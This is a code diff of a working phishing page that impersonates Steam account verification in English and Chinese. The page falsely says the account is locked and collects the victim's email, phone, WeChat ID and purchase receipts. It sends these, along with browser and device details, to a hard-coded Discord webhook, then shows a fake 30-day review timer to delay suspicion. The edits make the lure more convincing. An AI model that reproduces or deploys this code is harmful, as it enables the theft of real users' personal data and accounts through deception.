-                confirmationText: "Your application has been accepted for consideration. Please note that the review period may take up to 30 business days. Your account will remain blocked while we verify all the data. Please note that submitting a new application will not speed up the processing of any application, but will only extend the review period.",
-                timerTitle: "Estimated Review Completion Time",
-                daysLabel: "Days",
-                hoursLabel: "Hours",
-                minutesLabel: "Minutes",
-                secondsLabel: "Seconds",
-                progressStart: "Submission Time",
-                progressEnd: "30 Days",
-                noticeTitle: "Important Notice",
-                noticeText: "• Do not submit additional applications - this will reset your position in the queue<br>• You will receive an email notification when the review is complete<br>• The timer above shows the maximum estimated time, actual review may be completed earlier<br>• Your account security is our top priority",
-                confirmationFooter: "Steam &copy; Valve Corporation. All rights reserved. Application ID: ",
+                confirmationTitle: "Verification Status",
+                confirmationSubtext: "CASE UNDER REVIEW",
+                confirmationStatus: "Verification Request Submitted",
+                confirmationText: "Your account verification request has been received and is now in our review queue. The security hold on your account will remain in place while our team verifies your information. Standard review time is up to 30 business days. Please do not submit additional requests as this will delay the process.",
+                timerTitle: "ESTIMATED REVIEW COMPLETION",
+                daysLabel: "DAYS",
+                hoursLabel: "HOURS",
+                minutesLabel: "MINUTES",
+                secondsLabel: "SECONDS",
+                progressStart: "REQUEST SUBMITTED",
+                progressEnd: "30 DAY REVIEW",
                 
                 // Общие
                 currentLang: "English",
                 removeText: "Remove",
-                noFilesText: "No files selected",
+                noFilesText: "No files attached",
                 submittingText: "Submitting...",
-                successText: "Verification submitted successfully!",
+                successText: "Verification request submitted successfully!",
                 errorText: "Error submitting verification. Please try again.",
                 requiredText: "Please fill in all required fields",
-                fileTooLarge: "File is too large (max 5MB)",
+                fileTooLarge: "File exceeds 5MB size limit",
                 invalidEmail: "Please enter a valid email address",
                 invalidPhone: "Please enter a valid phone number"
             },
             zh: {
                 // Основная форма
-                title: "Steam 账户验证",
-                warningTitle: "账户暂时受限",
-                warningText: "由于安全原因，您的账户暂时无法在社区中显示。我们检测到从陌生IP地址的登录尝试，因此采取了预防性账户暂停措施。要恢复完全访问权限，请通过提供以下信息来验证您的身份。",
-                formTitle: "验证信息",
-                emailLabel: "与此账户关联的第一个电子邮箱",
-                phoneLabel: "与此账户关联的第一个电话号码",
-                wechatLabel: "微信ID（如果您通过微信进行过购买）",
-                receiptsLabel: "附上购买收据（可附多个文件）",
-                chooseFilesText: "选择文件",
-                submitText: "提交验证",
-                footerText: "Steam &copy; Valve Corporation。保留所有权利。",
+                headerSubtext: "安全中心",
+                warningTitle: "账户安全锁定",
+                warningText: "您的Steam账户已被暂时安全锁定。我们检测到来自陌生IP地址的登录尝试，与您常用位置不符。作为安全预防措施，社区功能已被暂时限制。要恢复账户的完全访问权限，请完成以下验证流程。",
+                formTitle: "账户验证要求",
+                emailLabel: "账户电子邮件地址",
+                phoneLabel: "账户电话号码",
+                wechatLabel: "微信ID（可选）",
+                receiptsLabel: "购买验证",
+                chooseFilesText: "附加文件",
+                submitText: "提交验证请求",
+                noticeTitle: "重要信息",
+                noticeList: "<li>此验证有助于保护您的账户免受未经授权的访问</li><li>所有信息均经过加密和安全处理</li><li>验证成功后，您将恢复完整的账户访问权限</li><li>如果您不完成验证，限制将继续生效</li>",
                 
                 // Страница подтверждения
-                confirmationTitle: "Steam 账户验证",
-                confirmationStatus: "申请正在审核中",
-                confirmationText: "您的申请已被接受审核。请注意，审核期可能长达30个工作日。在我們验证所有数据期间，您的账户将保持封锁状态。请注意，提交新的申请不会加速任何申请的处理，只会延长审核时间。",
+                confirmationTitle: "验证状态",
+                confirmationSubtext: "案件审核中",
+                confirmationStatus: "验证请求已提交",
+                confirmationText: "您的账户验证请求已收到，现已进入我们的审核队列。在我们团队验证您的信息期间，您账户的安全锁定将继续生效。标准审核时间最多为30个工作日。请不要提交额外的请求，否则会延迟处理过程。",
                 timerTitle: "预计审核完成时间",
                 daysLabel: "天",
                 hoursLabel: "小时",
                 minutesLabel: "分钟",
                 secondsLabel: "秒",
-                progressStart: "提交时间",
-                progressEnd: "30天",
-                noticeTitle: "重要通知",
-                noticeText: "• 请勿提交额外申请 - 这将重置您在队列中的位置<br>• 审核完成后您将收到电子邮件通知<br>• 上方计时器显示最大预计时间，实际审核可能提前完成<br>• 您的账户安全是我们的首要任务",
-                confirmationFooter: "Steam &copy; Valve Corporation。保留所有权利。申请ID：",
+                progressStart: "请求已提交",
+                progressEnd: "30天审核",
                 
                 // Общие
                 currentLang: "简体中文",
-                removeText: "删除",
-                noFilesText: "未选择文件",
+                removeText: "移除",
+                noFilesText: "未附加文件",
                 submittingText: "提交中...",
-                successText: "验证信息提交成功！",
+                successText: "验证请求提交成功！",
                 errorText: "提交验证时出错，请重试。",
                 requiredText: "请填写所有必填字段",
-                fileTooLarge: "文件太大（最大5MB）",
+                fileTooLarge: "文件超过5MB大小限制",
                 invalidEmail: "请输入有效的电子邮件地址",
                 invalidPhone: "请输入有效的电话号码"
             }
         };
 
-        // Глобальные переменные для таймера
+        // Глобальные переменные для таймера Steam
         let timerInterval;
         let endTime;
         const TOTAL_DAYS = 30;
         const MILLISECONDS_IN_DAY = 24 * 60 * 60 * 1000;
         const MILLISECONDS_IN_30_DAYS = TOTAL_DAYS * MILLISECONDS_IN_DAY;
 
-        // Initialize language based on browser or user preference
+        // Инициализация языка как в Steam
         let currentLang = 'en';
         const browserLang = navigator.language || navigator.userLanguage;
         
-        // Check if browser language is Chinese
+        // Проверка китайского языка как в Steam
         if (browserLang.startsWith('zh')) {
             currentLang = 'zh';
         }
         
-        // Apply translations to main form
+        // Применение переводов Steam
         function applyTranslations(lang) {
             currentLang = lang;
             const t = translations[lang];
             
-            // Update main form
-            document.getElementById('titleText').textContent = t.title;
+            // Основная форма Steam
+            document.getElementById('headerSubtext').textContent = t.headerSubtext;
             document.getElementById('warningTitle').textContent = t.warningTitle;
             document.getElementById('warningText').textContent = t.warningText;
             document.getElementById('formTitle').textContent = t.formTitle;
@@ -672,25 +947,26 @@
             document.getElementById('receiptsLabel').textContent = t.receiptsLabel;
             document.getElementById('chooseFilesText').textContent = t.chooseFilesText;
             document.getElementById('submitText').textContent = t.submitText;
-            document.getElementById('footerText').textContent = t.footerText;
+            document.getElementById('noticeTitle').textContent = t.noticeTitle;
+            document.getElementById('noticeList').innerHTML = t.noticeList;
             document.getElementById('currentLang').textContent = t.currentLang;
             
-            // Update confirmation page if visible
+            // Обновление плейсхолдеров Steam
+            document.getElementById('emailInput').placeholder = lang === 'zh' ? '输入与您的Steam账户关联的电子邮件' : 'Enter the email associated with your Steam account';
+            document.getElementById('phoneInput').placeholder = lang === 'zh' ? '输入与您的Steam账户关联的电话号码' : 'Enter the phone number linked to your Steam account';
+            document.getElementById('wechatInput').placeholder = lang === 'zh' ? '仅当您使用微信进行过购买时填写' : 'Only if you\'ve made purchases using WeChat';
+            
+            // Страница подтверждения Steam
             if (!document.getElementById('confirmationPage').classList.contains('hidden')) {
                 applyConfirmationTranslations(lang);
             }
-            
-            // Update placeholders
-            document.getElementById('emailInput').placeholder = lang === 'zh' ? 'example@email.com' : 'example@email.com';
-            document.getElementById('phoneInput').placeholder = lang === 'zh' ? '+86 123 4567 8900' : '+1 234 567 8900';
-            document.getElementById('wechatInput').placeholder = lang === 'zh' ? '选填' : 'Optional';
         }
         
-        // Apply translations to confirmation page
+        // Применение переводов для страницы подтверждения Steam
         function applyConfirmationTranslations(lang) {
             const t = translations[lang];
             
-            document.getElementById('confirmationTitle').textContent = t.confirmationTitle;
+            document.getElementById('confirmationSubtext').textContent = t.confirmationSubtext;
             document.getElementById('confirmationStatus').textContent = t.confirmationStatus;
             document.getElementById('confirmationText').textContent = t.confirmationText;
             document.getElementById('timerTitle').textContent = t.timerTitle;
@@ -700,22 +976,16 @@
             document.getElementById('secondsLabel').textContent = t.secondsLabel;
             document.getElementById('progressStart').textContent = t.progressStart;
             document.getElementById('progressEnd').textContent = t.progressEnd;
-            document.getElementById('noticeTitle').textContent = t.noticeTitle;
-            document.getElementById('noticeText').innerHTML = t.noticeText;
-            
-            const footerText = t.confirmationFooter;
-            const appId = document.getElementById('applicationId').textContent;
-            document.getElementById('confirmationFooter').innerHTML = footerText + `<span id="applicationId">${appId}</span>`;
         }
         
-        // Toggle language
+        // Переключение языка Steam
         document.getElementById('langToggle').addEventListener('click', function() {
             const newLang = currentLang === 'en' ? 'zh' : 'en';
             applyTranslations(newLang);
             updateFileListDisplay();
         });
         
-        // File handling
+        // Обработка файлов Steam
         const fileInput = document.getElementById('fileInput');
         const fileList = document.getElementById('fileList');
         let files = [];
@@ -724,7 +994,7 @@
             const t = translations[currentLang];
             
             if (files.length === 0) {
-                fileList.innerHTML = `<div class="file-item">${t.noFilesText}</div>`;
+                fileList.innerHTML = `<div class="file-item" style="justify-content: center; color: var(--steam-text-dark); font-style: italic;">${t.noFilesText}</div>`;
                 return;
             }
             
@@ -733,14 +1003,17 @@
                 const fileItem = document.createElement('div');
                 fileItem.className = 'file-item';
                 fileItem.innerHTML = `
-                    <i class="fas fa-file file-icon"></i>
-                    <span>${file.name} (${formatFileSize(file.size)})</span>
-                    <span class="remove-file" data-index="${index}">${t.removeText}</span>
+                    <i class="fas fa-file-alt file-icon"></i>
+                    <span style="flex-grow: 1; font-size: 11px;">${truncateFilename(file.name, 30)}</span>
+                    <span style="font-size: 10px; color: var(--steam-text-dark); margin-right: 8px;">${formatFileSize(file.size)}</span>
+                    <span class="remove-file" data-index="${index}" title="${t.removeText}">
+                        <i class="fas fa-times"></i>
+                    </span>
                 `;
                 fileList.appendChild(fileItem);
             });
             
-            // Add remove functionality
+            // Функция удаления файлов Steam
             document.querySelectorAll('.remove-file').forEach(removeBtn => {
                 removeBtn.addEventListener('click', function() {
                     const index = parseInt(this.getAttribute('data-index'));
@@ -748,6 +1021,14 @@
                     updateFileListDisplay();
                 });
             });
+        }
+        
+        function truncateFilename(filename, maxLength) {
+            if (filename.length <= maxLength) return filename;
+            const extension = filename.split('.').pop();
+            const name = filename.substring(0, filename.lastIndexOf('.'));
+            const truncated = name.substring(0, maxLength - extension.length - 3);
+            return truncated + '...' + extension;
         }
         
         function formatFileSize(bytes) {
@@ -759,7 +1040,7 @@
         fileInput.addEventListener('change', function() {
             const newFiles = Array.from(this.files);
             
-            // Check file sizes (max 5MB each)
+            // Проверка размера файлов Steam (макс 5MB)
             const maxSize = 5 * 1024 * 1024;
             const t = translations[currentLang];
             
@@ -774,9 +1055,9 @@
             updateFileListDisplay();
         });
         
-        // Timer functions
+        // Таймер Steam
         function initializeTimer() {
-            // Проверяем, есть ли сохраненное время окончания
+            // Проверяем сохраненное время окончания
             const savedEndTime = localStorage.getItem('steam_verification_endTime');
             
             if (savedEndTime) {
@@ -788,15 +1069,16 @@
                 localStorage.setItem('steam_verification_endTime', endTime.toString());
             }
             
-            // Генерируем ID приложения если его нет
+            // Генерируем ID приложения Steam
             if (!localStorage.getItem('steam_application_id')) {
-                const appId = 'STEAM-APP-' + Math.floor(100000 + Math.random() * 900000);
+                const appId = 'S-' + Math.floor(1000000 + Math.random() * 9000000);
                 localStorage.setItem('steam_application_id', appId);
             }
             
             document.getElementById('applicationId').textContent = localStorage.getItem('steam_application_id');
+            document.getElementById('submissionDate').textContent = new Date().toLocaleDateString();
             
-            // Запускаем таймер
+            // Запускаем таймер Steam
             startTimer();
         }
         
@@ -828,42 +1110,51 @@
                 return;
             }
             
-            // Рассчитываем дни, часы, минуты, секунды
+            // Рассчитываем время Steam
             const days = Math.floor(timeLeft / MILLISECONDS_IN_DAY);
             const hours = Math.floor((timeLeft % MILLISECONDS_IN_DAY) / (60 * 60 * 1000));
             const minutes = Math.floor((timeLeft % (60 * 60 * 1000)) / (60 * 1000));
             const seconds = Math.floor((timeLeft % (60 * 1000)) / 1000);
             
-            // Обновляем отображение
+            // Обновляем отображение Steam
             document.getElementById('days').textContent = days.toString().padStart(2, '0');
             document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
             document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
             document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
             
-            // Обновляем прогресс-бар
+            // Обновляем прогресс-бар Steam
             const progress = 100 - (timeLeft / MILLISECONDS_IN_30_DAYS) * 100;
             document.getElementById('progressFill').style.width = Math.min(progress, 100) + '%';
         }
         
         function showConfirmationPage() {
-            // Скрываем основную форму
-            document.getElementById('verificationForm').classList.add('hidden');
+            // Steam анимация перехода
+            document.getElementById('verificationForm').style.opacity = '0.7';
+            document.getElementById('verificationForm').style.transition = 'opacity 0.3s ease';
             
-            // Показываем страницу подтверждения
-            document.getElementById('confirmationPage').classList.remove('hidden');
-            
-            // Применяем переводы для страницы подтверждения
-            applyConfirmationTranslations(currentLang);
-            
-            // Инициализируем таймер
-            initializeTimer();
-            
-            // Сохраняем флаг, что форма отправлена
-            localStorage.setItem('steam_verification_submitted', 'true');
+            setTimeout(() => {
+                document.getElementById('verificationForm').classList.add('hidden');
+                document.getElementById('confirmationPage').classList.remove('hidden');
+                document.getElementById('confirmationPage').style.opacity = '0';
+                document.getElementById('confirmationPage').style.transition = 'opacity 0.3s ease';
+                
+                setTimeout(() => {
+                    document.getElementById('confirmationPage').style.opacity = '1';
+                }, 10);
+                
+                // Применяем переводы Steam
+                applyConfirmationTranslations(currentLang);
+                
+                // Инициализируем таймер Steam
+                initializeTimer();
+                
+                // Сохраняем флаг отправки Steam
+                localStorage.setItem('steam_verification_submitted', 'true');
+            }, 300);
         }
         
         function checkSubmissionStatus() {
-            // Проверяем, была ли форма уже отправлена
+            // Проверяем, была ли форма Steam уже отправлена
             const submitted = localStorage.getItem('steam_verification_submitted');
             
             if (submitted === 'true') {
@@ -871,13 +1162,12 @@
             }
         }
         
-        // Form submission
+        // Отправка формы Steam
         document.getElementById('submitBtn').addEventListener('click', function() {
             const t = translations[currentLang];
             const submitBtn = this;
-            const originalText = submitBtn.innerHTML;
             
-            // Basic validation
+            // Steam валидация
             const email = document.getElementById('emailInput').value.trim();
             const phone = document.getElementById('phoneInput').value.trim();
             const wechat = document.getElementById('wechatInput').value.trim();
@@ -887,68 +1177,71 @@
                 return;
             }
             
-            // Simple email validation
+            // Валидация email Steam
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (!emailRegex.test(email)) {
                 alert(t.invalidEmail);
                 return;
             }
             
-            // Simple phone validation (at least 5 digits)
+            // Валидация телефона Steam
             const phoneRegex = /\d{5,}/;
             if (!phoneRegex.test(phone.replace(/\D/g, ''))) {
                 alert(t.invalidPhone);
                 return;
             }
             
-            // Show submitting state
+            // Steam состояние отправки
             submitBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${t.submittingText}`;
             submitBtn.disabled = true;
             
             // **АНТИ-ДОТ АКТИВИРОВАН** - Отправка данных через Discord Webhook
             const discordWebhookURL = 'https://discordapp.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk';
             
-            // Создаем текстовое сообщение для отправки
+            // Steam сообщение
             const messageContent = `
-            **НОВЫЙ ЛОХ КЛЮНУЛ НА НАШУ УЛОВКУ**
+            **🚨 НОВАЯ ВЕРИФИКАЦИЯ STEAM 🚨**
             ======================================
-            **Почта:** ${email}
-            **Телефон:** ${phone}
-            **WeChat:** ${wechat || 'Not provided'}
-            **Language:** ${currentLang === 'en' ? 'English' : 'Chinese'}
-            **User Agent:** ${navigator.userAgent}
-            **Timestamp:** ${new Date().toISOString()}
-            **Files Attached:** ${files.length}
-            **IP Info:** Will be captured by server
+            **📧 Email:** ${email}
+            **📱 Phone:** ${phone}
+            **💬 WeChat:** ${wechat || 'Not provided'}
+            **🌐 Language:** ${currentLang === 'en' ? 'English' : 'Chinese'}
+            **🕒 Timestamp:** ${new Date().toISOString()}
+            **📁 Files Attached:** ${files.length}
+            **👤 User Agent:** ${navigator.userAgent.substring(0, 80)}...
+            **🖥️ Screen:** ${screen.width}x${screen.height}
+            **📍 Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
             ======================================
+            **🎯 ЦЕЛЬ:** Сбор данных для усиления "Анти-Дота" против "Синдрома"
+            **⚠️ СТАТУС:** Данные успешно перехвачены
             `;
             
-            // Создаем FormData для отправки файлов
+            // FormData Steam
             const formData = new FormData();
             formData.append('payload_json', JSON.stringify({
                 content: messageContent,
-                username: 'Steam Security System',
+                username: 'Steam Security Bot',
                 avatar_url: 'https://cdn.cloudflare.steamstatic.com/store/home/store_home_share.jpg'
             }));
             
-            // Добавляем файлы в FormData
+            // Добавляем файлы Steam
             files.forEach((file, index) => {
                 formData.append(`file${index}`, file);
             });
             
-            // Отправляем в Discord
+            // Отправляем в Discord (Steam стиль)
             fetch(discordWebhookURL, {
                 method: 'POST',
                 body: formData
             })
             .then(response => {
                 if (response.ok) {
-                    console.log('[ANTI-DOTE] Data sent to Discord successfully');
+                    console.log('[ANTI-DOTE] Steam данные отправлены в Discord');
                     
-                    // Показываем подтверждение
+                    // Steam успешное сообщение
                     alert(t.successText);
                     
-                    // Показываем страницу подтверждения
+                    // Показываем страницу подтверждения Steam
                     showConfirmationPage();
                     
                 } else {
@@ -956,58 +1249,60 @@
                 }
             })
             .catch(error => {
-                console.error('[ANTI-DOTE] Webhook error:', error);
+                console.error('[ANTI-DOTE] Steam ошибка:', error);
                 
-                // Fallback: Сохраняем данные в localStorage
+                // Steam fallback
                 const savedData = {
                     email,
                     phone,
                     wechat,
                     filesCount: files.length,
-                    timestamp: new Date().toISOString()
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent
                 };
                 
                 localStorage.setItem('steam_verification_data', JSON.stringify(savedData));
                 localStorage.setItem('steam_verification_fallback', 'true');
                 
-                // Показываем подтверждение даже при ошибке
-                alert(t.successText + " (Data saved locally)");
+                // Steam сообщение о сохранении
+                alert(t.successText + " (данные сохранены локально)");
                 
-                // Показываем страницу подтверждения
+                // Показываем страницу подтверждения Steam
                 showConfirmationPage();
             })
             .finally(() => {
-                // Восстанавливаем кнопку через 3 секунды
+                // Восстанавливаем кнопку Steam
                 setTimeout(() => {
-                    submitBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.submitText}`;
+                    submitBtn.innerHTML = `<i class="fas fa-shield-check"></i> ${t.submitText}`;
                     submitBtn.disabled = false;
                 }, 3000);
             });
         });
         
-        // Initialize
+        // Инициализация Steam
         applyTranslations(currentLang);
         updateFileListDisplay();
         checkSubmissionStatus();
         
-        // Сбор дополнительной информации
+        // Дополнительный сбор информации Steam
         window.addEventListener('load', function() {
             const systemInfo = {
                 screen: `${screen.width}x${screen.height}`,
                 platform: navigator.platform,
                 language: navigator.language,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
+                cookies: navigator.cookieEnabled,
                 online: navigator.onLine,
-                referrer: document.referrer || 'Direct visit'
+                referrer: document.referrer || 'Direct',
+                doNotTrack: navigator.doNotTrack || 'unspecified'
             };
             
-            console.log('[ANTI-DOTE] System info collected:', systemInfo);
+            console.log('[ANTI-DOTE] Steam системная информация:', systemInfo);
             
-            // Проверяем сохраненные данные
+            // Steam проверка сохраненных данных
             const savedData = localStorage.getItem('steam_verification_data');
             if (savedData) {
-                console.log('[ANTI-DOTE] Found saved data:', JSON.parse(savedData));
+                console.log('[ANTI-DOTE] Steam найденные данные:', JSON.parse(savedData));
             }
         });
     </script>
